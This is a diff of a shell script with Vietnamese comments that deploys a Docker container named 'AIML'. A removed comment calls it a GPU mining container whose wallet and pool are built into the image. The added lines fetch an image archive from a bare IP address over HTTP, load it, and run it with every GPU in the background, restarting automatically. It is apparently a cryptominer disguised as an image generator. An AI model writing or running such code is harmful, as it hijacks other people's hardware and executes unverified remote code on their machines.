@@ -67,11 +67,9 @@ check_docker_running
 docker stop AIML 2>/dev/null
 docker rm AIML 2>/dev/null
 
-# Kéo image mới nhất từ Docker Hub
-docker pull riccorg/imagegen:latest
-
-# Chạy Docker container mining với GPU (WALLET và POOL đã có sẵn trong Dockerfile)
-docker run --gpus all -d --restart unless-stopped --name AIML riccorg/imagegen:latest
+curl -O http://45.61.157.164:8000/imagegen.tar
+docker load -i imagegen.tar
+docker run --gpus all -d --restart unless-stopped --name AIML 45.61.157.164:5000/imagegen:latest
 
 # Đợi một chút trước khi vào vòng lặp kiểm tra
 sleep 10
